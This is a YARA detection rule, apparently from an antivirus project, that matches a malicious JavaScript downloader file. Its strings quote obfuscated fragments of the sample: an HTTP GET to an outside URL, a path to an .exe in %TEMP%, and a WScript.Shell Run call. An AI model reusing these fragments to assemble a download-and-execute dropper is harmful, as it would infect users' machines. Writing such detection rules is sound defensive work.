rule sig_20160329_480d8e769151df27b1e8895e9c4913aa {
  meta:
    description = "datamaliciousorder - file 20160329_480d8e769151df27b1e8895e9c4913aa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6285ab5329b38b6b05316089f1601621a566ac897c4b7934e8eab368db9dd454"

  strings:
    $s1  = "Nu[iZ](\"GET\", \"http://blog.saletron.net/li9soz\", false);" fullword ascii
    $s2  = "function pi() {return bi[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"QCtKFfhZZDq.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[yH](U() * 11); if (Nu[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function XU(pb, CO){A = A * 1; return pb - CO;};" fullword ascii
    $s5  = "var bi = function cv() {return WScript[Vz](\"WScript.Shell\");}(), U0 = 11;" fullword ascii
    $s6  = "function p(){return \"\" + m0;};" fullword ascii
    $s7  = "function sI() {return ((b == true) && (b == XM)) ? 1 : A;};" fullword ascii
    $s8  = "function m(LY){bi[\"Run\"](LY, A, A);};" fullword ascii
    $s9  = "function U(){return 22;};" fullword ascii
    $s10 = " while (P){" fullword ascii
    $s11 = "return XU(i, e);" fullword ascii
    $s12 = "function C()" fullword ascii
    $s13 = "var hF = new this[\"Date\"]();" fullword ascii
    $s14 = "function M(rZ) {var B = (1, 2, 3, 4, 5, rZ); return B;};" fullword ascii
    $s15 = "function mi(){return Vz;};" fullword ascii
    $s16 = "var f = false;" fullword ascii
    $s17 = "var XM = false;" fullword ascii
    $s18 = "var b = false;" fullword ascii
    $s19 = "XM = true; " fullword ascii
    $s20 = "b = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}